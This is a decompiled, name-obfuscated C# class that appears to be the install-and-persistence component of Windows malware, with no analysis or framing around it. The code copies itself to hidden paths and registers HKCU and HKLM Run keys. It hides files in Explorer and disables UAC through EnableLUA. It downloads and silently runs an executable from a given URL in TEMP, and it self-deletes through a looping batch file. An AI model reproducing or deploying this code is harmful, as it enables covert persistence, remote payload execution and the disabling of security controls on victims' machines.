using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.Win32;
using ns4;

namespace ns3;

internal class Class20
{
	private Mutex mutex_0;

	public void method_0()
	{
		method_1();
		method_7();
		method_2();
	}

	private void method_1()
	{
		try
		{
			mutex_0 = new Mutex(initiallyOwned: true, Class21.class16_0.string_4);
			mutex_0.ReleaseMutex();
		}
		catch
		{
			Environment.Exit(-1);
		}
	}

	private void method_2()
	{
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		if (method_5())
		{
			return;
		}
		try
		{
			string[] string_ = Class21.class16_0.string_9;
			foreach (string text in string_)
			{
				if (!Class21.class22_0.method_4(text))
				{
					File.Copy(fileName, text);
				}
				File.SetAttributes(text, FileAttributes.Hidden);
			}
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class21.class16_0.string_1[0], '"' + Class21.class16_0.string_9[0] + '"');
			Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class21.class16_0.string_1[1], '"' + Class21.class16_0.string_9[1] + '"');
		}
		catch
		{
		}
		try
		{
			mutex_0.Close();
			string[] string_ = Class21.class16_0.string_9;
			foreach (string fileName2 in string_)
			{
				Process process = new Process();
				process.StartInfo.FileName = fileName2;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
		}
		catch
		{
		}
		Environment.Exit(-1);
	}

	public void method_3(string string_0)
	{
		try
		{
			mutex_0.Close();
		}
		catch
		{
		}
		try
		{
			string text = Class21.class22_0.method_3(new Random().Next(5, 12)) + ".exe";
			new WebClient().DownloadFile(string_0, Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
		method_6();
		Environment.Exit(-1);
	}

	public void method_4()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(Class21.class16_0.string_1[0]);
			Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(Class21.class16_0.string_1[1]);
		}
		catch
		{
		}
		try
		{
			string[] string_ = Class21.class16_0.string_9;
			foreach (string path in string_)
			{
				File.Delete(path);
			}
		}
		catch
		{
		}
		method_6();
		Environment.Exit(-1);
	}

	private bool method_5()
	{
		string[] string_ = Class21.class16_0.string_9;
		int num = 0;
		if (0 < string_.Length)
		{
			string string_2 = string_[num];
			if (!Class21.class22_0.method_4(string_2))
			{
				return false;
			}
		}
		return true;
	}

	private void method_6()
	{
		try
		{
			string value = ":RP\ndel " + '"' + Environment.GetCommandLineArgs()[0] + '"' + "\nif exist " + '"' + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + '"' + " goto RP";
			TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat");
			textWriter.WriteLine(value);
			textWriter.Close();
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat";
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch
		{
		}
	}

	private void method_7()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("Hidden", "2", RegistryValueKind.DWord);
		}
		catch
		{
		}
		if (Class21.class16_0.bool_15)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
		}
	}
}
